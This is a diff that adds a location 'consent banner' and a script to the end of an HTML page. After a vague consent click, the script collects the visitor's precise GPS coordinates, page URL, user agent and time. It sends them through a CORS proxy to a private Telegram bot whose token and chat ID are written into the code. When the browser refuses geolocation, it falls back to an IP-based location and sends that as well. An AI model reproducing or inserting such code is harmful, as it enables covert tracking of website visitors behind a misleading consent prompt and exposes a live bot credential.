@@ -1111,5 +1111,177 @@
             }
         }, { once: true });
     </script>
+    <!-- Location Tracking Consent Banner -->
+<div class="consent-banner" id="consent-banner" style="
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    background: #1e2a78;
+    color: white;
+    padding: 20px;
+    text-align: center;
+    box-shadow: 0 -5px 20px rgba(0, 0, 0, 0.2);
+    z-index: 1000;
+    display: none;
+">
+    <p style="margin-bottom: 15px; font-size: 1.1rem;">
+        We use location tracking to improve our services. Do you consent to sharing your location data?
+    </p>
+    <button class="btn btn-accept" id="consent-yes" style="
+        padding: 12px 25px;
+        margin: 0 10px;
+        border: none;
+        border-radius: 50px;
+        cursor: pointer;
+        font-weight: 600;
+        transition: all 0.3s ease;
+        background-color: #00cc66;
+        color: white;
+    ">Yes, I agree</button>
+    <button class="btn btn-deny" id="consent-no" style="
+        padding: 12px 25px;
+        margin: 0 10px;
+        border: none;
+        border-radius: 50px;
+        cursor: pointer;
+        font-weight: 600;
+        transition: all 0.3s ease;
+        background-color: #ff4d4d;
+        color: white;
+    ">No, thanks</button>
+</div>
+
+<script>
+// Add this script to your existing HTML file
+document.addEventListener('DOMContentLoaded', function() {
+    const consentBanner = document.getElementById('consent-banner');
+    const consentYes = document.getElementById('consent-yes');
+    const consentNo = document.getElementById('consent-no');
+    
+    // Show consent banner after a delay
+    setTimeout(() => {
+        if (!localStorage.getItem('locationConsent')) {
+            consentBanner.style.display = 'block';
+        }
+    }, 2000);
+    
+    // Handle consent
+    consentYes.addEventListener('click', function() {
+        localStorage.setItem('locationConsent', 'true');
+        consentBanner.style.display = 'none';
+        getUserLocation();
+    });
+    
+    consentNo.addEventListener('click', function() {
+        localStorage.setItem('locationConsent', 'false');
+        consentBanner.style.display = 'none';
+    });
+    
+    // Check if user has already given consent
+    if (localStorage.getItem('locationConsent') === 'true') {
+        getUserLocation();
+    }
+    
+    // Function to get user location
+    function getUserLocation() {
+        if (!navigator.geolocation) {
+            console.log('Geolocation is not supported by this browser');
+            return;
+        }
+        
+        navigator.geolocation.getCurrentPosition(
+            function(position) {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+                
+                // Get additional information
+                const pageUrl = window.location.href;
+                const userAgent = navigator.userAgent;
+                const time = new Date().toLocaleString();
+                
+                // Send location to Telegram
+                sendToTelegram(latitude, longitude, pageUrl, userAgent, time);
+            },
+            function(error) {
+                console.log('Error getting location:', error.message);
+                
+                // Try to get approximate location from IP as fallback
+                getApproximateLocation();
+            },
+            {
+                enableHighAccuracy: true,
+                timeout: 5000,
+                maximumAge: 0
+            }
+        );
+    }
+    
+    // Fallback method to get approximate location from IP
+    function getApproximateLocation() {
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                const latitude = data.latitude;
+                const longitude = data.longitude;
+                const city = data.city;
+                const country = data.country_name;
+                
+                const pageUrl = window.location.href;
+                const userAgent = navigator.userAgent;
+                const time = new Date().toLocaleString();
+                
+                // Send approximate location to Telegram
+                sendToTelegram(latitude, longitude, pageUrl, userAgent, time, 
+                              `Approximate location (from IP): ${city}, ${country}`);
+            })
+            .catch(error => {
+                console.log('Error getting approximate location:', error);
+            });
+    }
+    
+    // Function to send data to Telegram
+    function sendToTelegram(lat, lng, pageUrl, userAgent, time, additionalInfo = '') {
+        // Replace with your actual Telegram bot token and chat ID
+        const botToken = '8492522672:AAGbB8zQViMqkz1T7lCmJ1k1njoqcQ5mSe0';
+        const chatId = '5090063089';
+        
+        // Format message
+        let message = `🌍 New Website Visitor!\n\n`;
+        message += `📍 Location: https://maps.google.com/?q=${lat},${lng}\n`;
+        message += `🕒 Time: ${time}\n`;
+        message += `🔗 Page: ${pageUrl}\n`;
+        
+        if (additionalInfo) {
+            message += `ℹ️ ${additionalInfo}\n`;
+        }
+        
+        message += `\nUser Agent: ${userAgent}`;
+        
+        // Use a proxy to avoid CORS issues
+        const proxyUrl = 'https://corsproxy.io/?';
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        
+        // Send request
+        fetch(proxyUrl + encodeURIComponent(telegramUrl), {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Message sent to Telegram:', data);
+        })
+        .catch(error => {
+            console.error('Error sending to Telegram:', error);
+        });
+    }
+});
+</script>
 </body>
 </html>
